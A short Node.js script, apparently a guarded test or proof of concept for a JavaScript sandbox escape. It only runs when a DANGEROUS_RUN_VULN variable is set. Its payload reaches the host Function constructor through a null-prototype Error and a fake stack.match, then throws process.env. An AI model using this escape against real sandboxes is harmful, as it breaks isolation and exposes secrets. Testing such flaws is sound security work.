if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const out = (function () {
	var ex = new Error();
	ex.__proto__ = null;
	ex.stack = {
		match: (x) => {
			return x.constructor.constructor("throw process.env")();
		},
	};
	return ex;
})();
console.log(out);

setTimeout(() => {
	process.exit(82);
}, 1000);
